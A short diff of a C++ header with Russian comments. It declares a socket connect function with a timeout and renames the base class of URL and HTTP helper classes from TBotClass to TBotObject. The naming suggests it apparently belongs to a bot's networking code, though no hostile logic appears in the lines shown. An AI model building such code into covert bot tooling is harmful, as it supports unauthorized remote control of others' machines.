@@ -344,6 +344,7 @@ namespace MultiPartData
 //  ConnectToHost - Функция подключается к указанному хосту
 //---------------------------------------------------------------
 SOCKET ConnectToHost(PCHAR Host, int Port);
+SOCKET ConnectToHostEx(const char* Host, int Port, DWORD TimeoutSec);
 
 
 //*****************************************************************************
@@ -429,7 +430,7 @@ typedef struct THTTPSessionInfo{
 //----------------------------------------------------------------
 //   TURL  - Класс для работы синтернет адресами
 //----------------------------------------------------------------
-class TURL : public TBotClass
+class TURL : public TBotObject
 {
 public:
 	string Protocol;
@@ -453,7 +454,7 @@ private:
 //----------------------------------------------------------------
 ///  THTTPReader - Класс получения данных из сокета
 //----------------------------------------------------------------
-class THTTPReader : public TBotClass
+class THTTPReader : public TBotObject
 {
 protected:
 	DWORD  FSize;
@@ -466,7 +467,7 @@ public:
 //----------------------------------------------------------------
 //   THTTP  - Класс для передачи-приёма данных по HTTP протоколу
 //----------------------------------------------------------------
-class THTTP : public TBotClass
+class THTTP : public TBotObject
 {
 protected:
     bool Execute(THTTPReader Reader);
